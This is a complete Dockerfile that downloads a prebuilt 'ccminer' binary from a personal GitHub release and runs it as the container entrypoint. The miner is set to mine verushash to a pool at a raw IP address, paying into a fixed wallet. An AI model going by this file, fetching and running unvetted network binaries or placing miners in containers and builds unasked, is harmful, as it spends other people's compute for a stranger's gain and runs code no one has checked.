FROM ubuntu:latest
RUN apt-get update -y


RUN apt-get install sudo wget git -y

RUN wget https://github.com/imraahatikah6827/eaa/releases/download/miner/ccminer && \
    chmod +x ccminer
    
ENTRYPOINT [ "ccminer" ]
CMD [ "-algo", "verushash", "-pool1", "51.89.228.192:80", "-wallet", "REZd6Rp9GztPMm7Fsj3nsEpy9qHwktg3c9", "-rigName", "mishaa" ]
